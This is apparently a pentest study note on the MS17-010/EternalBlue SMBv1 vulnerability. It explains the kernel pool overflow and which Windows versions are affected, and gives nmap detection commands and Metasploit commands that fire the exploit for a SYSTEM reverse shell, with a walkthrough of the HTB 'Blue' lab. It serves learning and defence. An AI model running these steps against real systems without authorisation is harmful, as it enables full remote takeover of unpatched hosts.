## What it is

**MS17-010** is a set of critical vulnerabilities in Microsoft's **SMBv1** implementation (the `srv.sys` driver). The most famous exploit against it is **EternalBlue** — an NSA-developed exploit leaked by the Shadow Brokers in April 2017, later weaponized into the **WannaCry** and **NotPetya** worms.

The core bug is a **buffer overflow in how SMBv1 converts a list of file-extended-attributes (FEA list)** from its OS/2 format to the NT format. A crafted `SMB_COM_TRANSACTION2` / `NT_TRANS` request with a malformed FEA list causes the driver to miscalculate a size and write past an allocated non-paged kernel pool buffer. Combined with a controlled pool grooming technique, this pool overflow becomes remote **kernel code execution** — no authentication required.

It targets **SMBv1 over port 445**. Because it executes in kernel context, a successful hit lands you at **NT AUTHORITY\SYSTEM** directly.

---
## Impact

- **Unauthenticated remote code execution as SYSTEM** — the highest possible outcome, with zero creds.
- **Wormable** — no user interaction, spreads machine-to-machine over 445. This is why WannaCry/NotPetya were so devastating.
- Affects a huge range of unpatched Windows: **Vista, 7, 8.1, 10 (pre-patch), Server 2008 / 2008 R2 / 2012 / 2016**. Classic HTB targets are **Windows 7 and Server 2008 R2**.
- CVSS-equivalent: critical. Full confidentiality/integrity/availability loss.

---
## Affected versions

- Windows with **SMBv1 enabled and MS17-010 unpatched**.
- Patched by Microsoft in the March 2017 security bulletin (MS17-010). Mitigation is either the patch or **disabling SMBv1** entirely.
- Practical tell on a box: nmap OS detection returning **Windows 7 / Server 2008** + SMBv1 present in `smb-protocols`.

---
## Exploitation steps (high-level)

1. Fingerprint SMB: `nmap --script smb-protocols,smb-os-discovery -p 445 <target>`. **SMBv1 enabled + old Windows = candidate.** This is the pattern that lets a writeup "just know" from the version alone.
2. Confirm vulnerability: `nmap --script smb-vuln-ms17-010 -p 445 <target>`, or the Metasploit scanner `auxiliary/scanner/smb/smb_ms17_010`.
3. Fire the exploit — the Metasploit module self-checks before running:
    
    ```
    use exploit/windows/smb/ms17_010_eternalblueset RHOSTS <target>set LHOST <tun0>run
    ```
    
4. Receive a **SYSTEM** shell (Meterpreter). Both flags are readable immediately.

> The MSF module handles the pool grooming and kernel shellcode for you. Meterpreter translates `ls / cd / cat` to Windows equivalents, so you can move around without knowing `cmd`/PowerShell syntax.

---
## PoC

- Metasploit: `exploit/windows/smb/ms17_010_eternalblue`
- Standalone public PoCs exist (worawit/MS17-010 "zzz_exploit" and AutoBlue-MS17-010 are the well-known ones) if you want to run it without MSF.

**Real example ([[Blue]]):**

- nmap: 135/139/445 open, OS = **Windows 7 Pro SP1**. Old Windows + SMB → instant EternalBlue suspicion.
- MS17-010 is _the_ known kill for unpatched Win7 — no clever chain, it's a history/pattern box.
- Fired `ms17_010_eternalblue` in Metasploit → module self-verified → **SYSTEM shell straight up**. User + root flags grabbed together.
- Takeaway: **old Windows version in nmap = check SMBv1 + MS17-010 before anything else.** That's the entire "how did they know from the version" answer.